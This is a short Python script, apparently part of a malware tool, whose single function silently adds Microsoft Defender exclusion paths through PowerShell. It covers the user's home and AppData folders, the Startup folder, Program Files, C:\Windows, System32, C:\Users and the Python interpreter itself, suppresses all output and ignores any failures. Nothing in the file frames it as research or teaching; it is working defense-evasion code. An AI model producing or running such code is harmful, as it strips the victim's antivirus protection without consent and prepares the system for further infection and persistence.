import sys, os, subprocess
from concurrent.futures import ThreadPoolExecutor
sys.dont_write_bytecode=True

def excludeme():
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    exclusion_folder = os.path.join(os.getenv("APPDATA"), "exclusion_folder")
    appdata_folder = os.getenv("APPDATA")
    appdata_local_browsing = os.path.join(os.getenv("APPDATA"), "Local", "browsing")
    appdata_local_pictures_task = os.path.join(os.getenv("APPDATA"), "Local", "Pictures", "task")
    appdata_local_pictures = os.path.join(os.getenv("APPDATA"), "Local", "Pictures")
    appdata_local_downloads = os.path.join(os.getenv("APPDATA"), "Local", "Downloads")
    appdata_local_documents = os.path.join(os.getenv("APPDATA"), "Local", "Documents")
    appdata_roaming = os.path.join(os.getenv("APPDATA"), "Roaming")
    
    try: os.makedirs(exclusion_folder, exist_ok=True)
    except: pass
    
    folders_to_exclude = [
        os.path.expanduser("~"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Pictures"),
        os.path.join(os.path.expanduser("~"), "Videos"),
        os.path.join(os.path.expanduser("~"), "Music"),
        appdata_folder,
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming"),
        os.path.join(os.path.expanduser("~"), "AppData", "Local"),
        os.path.join(os.path.expanduser("~"), "AppData", "LocalLow"),
        os.path.join("C:\\", "Program Files"),
        os.path.join("C:\\", "Program Files (x86)"),
        os.path.join("C:\\", "Windows", "System32"),
        os.path.join("C:\\", "Windows"),
        os.path.join("C:\\", "Users"),
        os.path.join("C:\\", "Temp"),
        os.path.join("C:\\", "ProgramData"),
        startup_folder,
        sys.executable,
        exclusion_folder
    ]
    
    if os.path.exists(appdata_local_browsing): folders_to_exclude.append(appdata_local_browsing)
    if os.path.exists(appdata_local_pictures_task): folders_to_exclude.append(appdata_local_pictures_task)
    if os.path.exists(appdata_local_pictures): folders_to_exclude.append(appdata_local_pictures)
    if os.path.exists(appdata_local_downloads): folders_to_exclude.append(appdata_local_downloads)
    if os.path.exists(appdata_local_documents): folders_to_exclude.append(appdata_local_documents)
    if os.path.exists(appdata_roaming): folders_to_exclude.append(appdata_roaming)
    
    def add_exclusion(folder):
        try: subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{folder}'"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
    
    with ThreadPoolExecutor() as executor: executor.map(add_exclusion, folders_to_exclude)
